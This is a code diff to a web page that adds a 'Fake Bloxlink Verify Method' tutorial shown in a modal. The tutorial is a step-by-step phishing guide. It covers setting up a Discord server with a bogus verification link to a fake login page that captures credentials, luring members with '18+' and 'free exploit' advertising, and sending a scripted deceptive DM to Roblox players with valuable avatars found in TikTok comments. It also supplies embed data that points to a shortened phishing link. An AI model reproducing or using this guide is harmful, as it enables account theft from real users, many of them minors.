@@ -1621,22 +1621,90 @@
       </div>
     `;
 
+    const BLOXLINK_METHOD_HTML = `
+      <div class="method-tutorial">
+        <p style="margin-bottom: 10px; color: var(--text-primary);">This method uses a fake Bloxlink verification system to capture user credentials. Set up a professional-looking Discord server with a single verification channel to maximize trust and conversion.</p>
+
+        <div>
+          <div class="step-title">Step 1: Server Setup</div>
+          <div class="step-content">
+            &bull; Create a new Discord server<br>
+            &bull; Set up a single &quot;Verify&quot; channel that looks completely legitimate<br>
+            &bull; Place a fake Bloxlink verification button/link in that channel<br>
+            &bull; The link should look very real and professional
+          </div>
+        </div>
+
+        <div>
+          <div class="step-title">Step 2: Fake Login Page</div>
+          <div class="step-content">
+            &bull; When someone clicks &quot;Verify&quot;, redirect them to a fake login page (beaming link)<br>
+            &bull; Once they log in, you receive all their information<br>
+            &bull; Works just like a normal beam
+          </div>
+        </div>
+
+        <div>
+          <div class="step-title">Step 3: How to Get Members</div>
+          <div class="step-content">
+            &bull; Post the server on X.com (Twitter) as a &quot;Roblox Condo Server&quot; or &quot;18+ Roblox Server&quot;<br>
+            &bull; Upload videos on YouTube promoting &quot;Free Roblox Exploits Server&quot; or &quot;Best Roblox Server 2026&quot;<br>
+            &bull; List the server on Disboard and bump it every 2 hours<br>
+            &bull; Share it on TikTok, Reddit, or other Roblox-related communities
+          </div>
+        </div>
+
+        <div>
+          <div class="step-title">Step 4: Targeted DMs (Most Effective)</div>
+          <div class="step-content">
+            &bull; Go to TikTok and search for &quot;avatar rating&quot; videos<br>
+            &bull; Look through the comments for people with rich/limited avatars<br>
+            &bull; Send them a friendly DM like:<br>
+            <em>&quot;Heyy! I&apos;m currently hosting a Roblox avatar contest and your outfits look really cool! If you&apos;re interested, feel free to join my server: [invite]&quot;</em><br>
+            &bull; You can also create your own avatar rating or avatar contest videos to attract even more people
+          </div>
+        </div>
+
+        <div>
+          <div class="step-title">Step 5: Important Tips for Success</div>
+          <div class="step-content">
+            &bull; Make the server look clean and professional: nice icon, good channel styling<br>
+            &bull; Hide all other channels so new members only see the &quot;Verify&quot; channel<br>
+            &bull; The fake Bloxlink message should look as authentic as possible<br>
+            &bull; Don&apos;t forget to hide all other channels
+          </div>
+        </div>
+
+        <div>
+          <div class="step-title">Resources &amp; Assets</div>
+          <div class="step-content">
+            &bull; <a href="https://imgur.com/a/8cstzQ6">Profile Picture Asset</a><br>
+            &bull; <a href="https://discohook.app/?data=eyJ2ZXJzaW9uIjoiZDIiLCJtZXNzYWdlcyI6W3siX2lkIjoibTM3a3czbFhtayIsImRhdGEiOnsiY29udGVudCI6IlRvIHZlcmlmeSB3aXRoIEJsb3hsaW5rLCBjbGljayB0aGUgbGluayBiZWxvdy4iLCJlbWJlZHMiOlt7InRpdGxlIjoiQ2xpY2sgSGVyZSIsImNvbG9yIjoyMTA1Mzc2LCJhdXRob3IiOnsibmFtZSI6IlZlcmlmeSB3aXRoIEJsb3hsaW5rIn0sInVybCI6Imh0dHBzOi8vaXMuZ2QvUEpoVzhLIn1dLCJhdHRhY2htZW50cyI6W10sImNvbXBvbmVudHMiOltdfX1dfQ">Discohook Embed Data</a><br>
+            &bull; <a href="https://www.youtube.com/watch?v=8eS598w-PWA">Video Tutorial</a>
+          </div>
+        </div>
+      </div>
+    `;
+
     window.openModalFromNum = function(methodNum) {
       const modal = document.getElementById('method-modal');
       const title = document.getElementById('modal-title');
       const content = document.getElementById('modal-content-text');
-      const isBest = methodNum === '1';
-      
-      if (isBest) {
+
+      if (methodNum === '1') {
         title.innerHTML = 'Condo Method BOT <span style="font-size: 10px; color: #ff2d55; border: 1px solid #ff2d55; padding: 2px 6px; border-radius: 4px; margin-left: 12px; letter-spacing: 0.5px; font-weight: 800;">BEST</span>';
         content.innerHTML = CONDO_METHOD_HTML;
+        content.style.textAlign = 'left';
+      } else if (methodNum === '2') {
+        title.innerHTML = 'Fake Bloxlink Verify Method';
+        content.innerHTML = BLOXLINK_METHOD_HTML;
         content.style.textAlign = 'left';
       } else {
         title.innerHTML = 'Method ' + methodNum;
         content.innerHTML = '#-#';
         content.style.textAlign = 'center';
       }
-      
+
       modal.classList.add('active');
     };
 
